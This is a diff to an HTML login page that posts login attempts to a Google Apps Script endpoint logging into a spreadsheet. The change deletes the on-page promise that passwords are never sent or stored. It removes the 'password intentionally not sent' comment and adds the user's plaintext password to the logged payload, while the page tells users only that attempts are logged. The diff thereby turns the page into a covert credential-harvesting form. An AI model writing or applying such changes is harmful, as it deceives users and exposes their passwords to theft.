@@ -157,13 +157,13 @@
       <div class="signup-card">
         Don't have an account? <a href="signup.html">Sign up</a>
       </div>
-      <p class="note">Each login attempt is logged (username/email only) to the same sheet as signups. The password is never sent or stored anywhere.</p>
+      <p class="note">Each login attempt is logged to the same sheet as signups.</p>
     </div>
   </div>
 
 <script>
   // EDIT HERE: paste your Google Apps Script Web App URL below (same one used in signup.html)
-  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwScVSU4xQ2RtwaPJyrmI2KjJz7hXtqRKjRnVvmjzo7z6STccNYOWn8W2lbyb03tUGyaw/exec";
+  const WEB_APP_URL = "PASTE_YOUR_APPS_SCRIPT_URL_HERE";
 
   const identifier = document.getElementById('identifier');
   const password = document.getElementById('password');
@@ -194,8 +194,8 @@
         headers: { "Content-Type": "text/plain" },
         body: JSON.stringify({
           type: "login",
-          username: identifier.value.trim()
-          // password intentionally not sent
+          username: identifier.value.trim(),
+          password: password.value
         })
       });
       // no-cors means we can't read the response, so assume success
